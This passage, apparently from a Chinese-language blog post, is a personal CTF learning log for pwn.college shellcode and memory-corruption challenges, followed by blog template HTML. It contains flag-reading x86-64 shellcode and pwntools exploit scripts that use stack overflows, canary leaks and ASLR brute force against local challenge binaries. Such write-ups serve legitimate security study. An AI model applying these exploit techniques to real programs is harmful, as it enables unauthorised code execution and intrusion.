+</span></span><span style="display:flex;"><span>    mov rdi, rsp              ## 第一个参数：指向栈顶的指针（即 <span style="color:#f1fa8c">&#34;/flag&#34;</span>）
+</span></span><span style="display:flex;"><span>    xor rsi, rsi              ## 第二个参数：<span style="color:#bd93f9">0</span> (O_RDONLY)
+</span></span><span style="display:flex;"><span>    syscall                   ## 执行系统调用 open
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ## 使用 sendfile 将文件内容发送到 stdout
+</span></span><span style="display:flex;"><span>    mov rdi, <span style="color:#bd93f9">1</span>                ## 第一个参数：stdout 文件描述符
+</span></span><span style="display:flex;"><span>    mov rsi, rax              ## 第二个参数：open 返回的文件描述符
+</span></span><span style="display:flex;"><span>    xor rdx, rdx              ## 第三个参数：文件内的起始偏移
+</span></span><span style="display:flex;"><span>    mov r10, <span style="color:#bd93f9">1000</span>             ## 第四个参数：传输的字节数
+</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#bd93f9">40</span>               ## 系统调用号：<span style="color:#bd93f9">40</span> (sendfile)
+</span></span><span style="display:flex;"><span>    syscall                   ## 执行系统调用 sendfile
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ## 退出
+</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#bd93f9">60</span>               ## 系统调用号：<span style="color:#bd93f9">60</span> (exit)
+</span></span><span style="display:flex;"><span>    xor rdi, rdi              ## 第一个参数：退出状态码 <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    syscall                   ## 执行系统调用 exit
+</span></span></code></pre></div><h2 id="一些神必总结">一些神必总结</h2>
+<ol>
+<li>nop sled</li>
+</ol>
+<p>nop （0x90) 程序计数器+1，可以应对level2中的随机丢失</p>
+<ol>
+<li>寄存器拼接参数</li>
+</ol>
+<p>mov al shl 8等等拼接寄存器</p>
+<ol>
+<li>push pop 代替mov</li>
+<li>凑字</li>
+</ol>
+<p>/bin///sh 可以凑八个Byte</p>
+<ol>
+<li>chmod 给一个文件 4权限（读）可以绕过permission denied</li>
+<li>可以自己写一个c语言脚本，然后execve(c)</li>
+</ol>
+<h2 id="memoryerror">memoryError</h2>
+<h1 id="利用补码做无符号整数溢出">利用补码做无符号整数溢出</h1>
+<p>-1 变为Tmin</p>
+<p>或者</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> pwn
+</span></span><span style="display:flex;"><span>r <span style="color:#ff79c6">=</span> pwn.process(<span style="color:#f1fa8c">&#34;/challenge/babymem_level5.0&#34;</span>)
+</span></span><span style="display:flex;"><span>r.sendline(<span style="color:#f1fa8c">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>r.sendline(<span style="color:#f1fa8c">&#34;2147483648&#34;</span>)
+</span></span><span style="display:flex;"><span>r.sendline(b<span style="color:#f1fa8c">&#39;\x00&#39;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">88</span> <span style="color:#ff79c6">+</span> b<span style="color:#f1fa8c">&#39;\x64\x21\x40\x00\x00\x00\x00\x00&#39;</span>)
+</span></span></code></pre></div><h2 id="level-7-1">level 7</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>arch <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># context.log_level = &#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>table <span style="color:#ff79c6">=</span> []
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0x10</span>):
+</span></span><span style="display:flex;"><span>    table<span style="color:#ff79c6">.</span>append(i)
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># for i in range(0x0,0xf):</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     try:</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#         p = process(&#34;/challenge/babymem_level7.0&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#         p.recvuntil(&#34;size:&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#         p.sendline(&#34;200&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#         payload = b&#39;a&#39;*0x78 + b&#39;\x56\x22&#39; + bytes([i])</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#         p.sendlineafter(b&#34;bytes)!&#34;, payload)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#         s = p.recv()</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#         if b&#39;pwn.college&#39; in s:</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#             correct_byte = i</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#             found = True</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#             print(f&#34;Success with byte: {hex(i)}&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#             break</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     except Exception as e:</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#         print(f&#34;Failed at byte {hex(i)} with error {str(e)}&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     finally:</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#         p.close()</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># while 1:</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     higher_byte = random.choice(table) &lt;&lt; 4</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     success(hex(higher_byte))</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     guess = bytes([higher_byte | 0x2])</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     payload = b&#39;a&#39;*0x78 + b&#39;\x3a&#39; + guess</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     p = process(&#34;/challenge/babymem_level7.0&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     p.recvuntil(&#34;size:&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     p.sendline(str(len(payload)))</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     p.sendlineafter(b&#34;bytes)!&#34;, payload)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     # p.interactive()</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     result = p.recv()</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     if b&#39;pwn.college&#39; in result:</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#         p.recvline()</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#         break</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> <span style="color:#bd93f9">1</span>:
+</span></span><span style="display:flex;"><span>    higher_byte <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xf</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">4</span>
+</span></span><span style="display:flex;"><span>    success(<span style="color:#8be9fd;font-style:italic">hex</span>(higher_byte))
+</span></span><span style="display:flex;"><span>    guess <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytes</span>([higher_byte <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0x2</span>])
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;a&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x78</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x5d</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">+</span> guess
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#34;/challenge/babymem_level7.0&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;size:&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendline(<span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#8be9fd;font-style:italic">len</span>(payload)))
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;bytes)!&#34;</span>, payload)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 0x7ffe4ddb47e8 winvalue</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 0x7ffe4ddb47c0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 256</span>
+</span></span></code></pre></div><p>开了PIE（ASLR) ,页码的对齐机制会保证他最后三位是一样的，因此我们需要猜第四位，固定为f开始反复运行 直至猜对为止</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>higher_byte <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xf</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">4</span>
+</span></span><span style="display:flex;"><span>    success(hex(higher_byte))
+</span></span><span style="display:flex;"><span>    guess <span style="color:#ff79c6">=</span> higher_byte <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0x2</span>
+</span></span><span style="display:flex;"><span>    guess <span style="color:#ff79c6">=</span> guess <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">8</span>
+</span></span><span style="display:flex;"><span>    guess <span style="color:#ff79c6">=</span> guess <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0x5d</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> b<span style="color:#f1fa8c">&#39;a&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x78</span> <span style="color:#ff79c6">+</span> p16(guess)
+</span></span></code></pre></div><p>或者这样拼接也可以</p>
+<h2 id="level-8-1">level 8</h2>
+<p>开ASLR</p>
+<p>但是由于linux的内存机制 低三位不变 因此爆破第四位</p>
+<p>p8() 一个byte 小端</p>
+<p>p16() 一个 word 小端</p>
+<h2 id="level-11-1">level 11</h2>
+<p>mmap函数</p>
+<p>mmap将一个文件或者其它对象映射进内存。文件被映射到多个页上，如果文件的大小不是所有页的大小之和，最后一个页不被使用的空间将会清零。mmap在用户空间映射调用系统中作用很大。</p>
+<p><a href="https://zhuanlan.zhihu.com/p/477641987">Linux 内存映射函数 mmap（）函数详解 - 知乎 (zhihu.com)</a></p>
+<p>内存映射，简而言之就是将用户空间的一段内存区域映射到内核空间，映射成功后，用户对这段内存区域的修改可以直接反映到内核空间，同样，内核空间对这段区域的修改也直接反映用户空间。那么对于内核空间&lt;&mdash;-&gt;用户空间两者之间需要大量数据传输等操作的话效率是非常高的。</p>
+<p>以下是一个把普遍文件映射到用户空间的内存区域的示意图。</p>
+<p>图一：</p>
+<p>
+  <img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/0187b481-6859-4861-8018-326f9c1e091d/fed9a599-6ce4-4312-b94a-c453f6f4e206/Untitled.png" alt="Untitled">
+
+</p>
+<h2 id="level-12-1">level 12</h2>
+<p>这个题有一个后门</p>
+<p>需要将buf中有字符串<code>REPEAT</code></p>
+<p>
+  <img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/0187b481-6859-4861-8018-326f9c1e091d/3ee88928-53c9-454f-9948-87955d35547d/Untitled.png" alt="Untitled">
+
+</p>
+<p>然后会重新运行challenge，我们可以先leak一下canary 然后再改返回地址 由于开了ASLR 因此需要多重试几次</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>from pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>context.arch <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> <span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#34;/challenge/babymem_level12.0&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    # context.log_level<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>    # context.terminal <span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;tmux&#39;</span>,<span style="color:#f1fa8c">&#39;splitw&#39;</span>,<span style="color:#f1fa8c">&#39;-h&#39;</span>]
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> payload1 <span style="color:#ff79c6">=</span> b<span style="color:#f1fa8c">&#39;REPEAT&#39;</span> <span style="color:#ff79c6">+</span> b<span style="color:#f1fa8c">&#39;a&#39;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">0x58</span><span style="color:#ff79c6">-</span>len(b<span style="color:#f1fa8c">&#39;REPEAT&#39;</span>)) <span style="color:#ff79c6">+</span> b<span style="color:#f1fa8c">&#39;b&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    size <span style="color:#ff79c6">=</span> len(payload)
+</span></span><span style="display:flex;"><span>    length <span style="color:#ff79c6">=</span> str(len(payload)).encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p.sendlineafter(<span style="color:#f1fa8c">&#34;size:&#34;</span>,length)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p.sendlineafter(<span style="color:#f1fa8c">&#34;bytes)!&#34;</span>,payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p.recvuntil(<span style="color:#f1fa8c">&#34;You said:&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ret <span style="color:#ff79c6">=</span> p.recvuntil(<span style="color:#f1fa8c">&#34;Backdoor&#34;</span>)
+</span></span><span style="display:flex;"><span>    # p.recvall()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    canary <span style="color:#ff79c6">=</span> b<span style="color:#f1fa8c">&#39;\x00&#39;</span> <span style="color:#ff79c6">+</span> ret[size <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span>size<span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>] # 找到canary
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    success(f<span style="color:#f1fa8c">&#34;canaray: {canary}&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> b<span style="color:#f1fa8c">&#39;a&#39;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x58</span> <span style="color:#ff79c6">+</span> canary <span style="color:#ff79c6">+</span> b<span style="color:#f1fa8c">&#39;a&#39;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">+</span> p8(<span style="color:#bd93f9">0xfc</span>) <span style="color:#ff79c6">+</span> p8(<span style="color:#bd93f9">0x21</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    length <span style="color:#ff79c6">=</span> str(len(payload)).encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p.sendlineafter(<span style="color:#f1fa8c">&#34;size:&#34;</span>,length)
+</span></span><span style="display:flex;"><span>    # gdb.attach(p)
+</span></span><span style="display:flex;"><span>    p.sendlineafter(<span style="color:#f1fa8c">&#34;bytes)!&#34;</span>,payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    result <span style="color:#ff79c6">=</span> p.recvall()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> b<span style="color:#f1fa8c">&#34;}&#34;</span> <span style="color:#ff79c6">in</span> result<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        success(result)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>
+</span></span><span style="display:flex;"><span># payload <span style="color:#ff79c6">=</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># p.sendlineafter(<span style="color:#f1fa8c">&#34;size:&#34;</span>,length)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># p.interactive()
+</span></span></code></pre></div>
+
+                
+
+                
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2018/01/02/nginmesh-install/" data-toggle="tooltip" data-placement="top" title="Nginx开源Service Mesh组件Nginmesh安装指南">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/blindfmt/" data-toggle="tooltip" data-placement="top" title="pwn·blindfmt学习记录">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+                
+
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        <a href="/tags/ctf" title="ctf">
+                            ctf
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/istio" title="istio">
+                            istio
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/nginmesh" title="nginmesh">
+                            nginmesh
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/pwn" title="pwn">
+                            pwn
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/service-mesh" title="service mesh">
+                            service mesh
+                        </a>
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:empire258700@gmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/ZephyrVictor">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="#3" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; #3 2024
+                    
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+
+</body>
+</html>
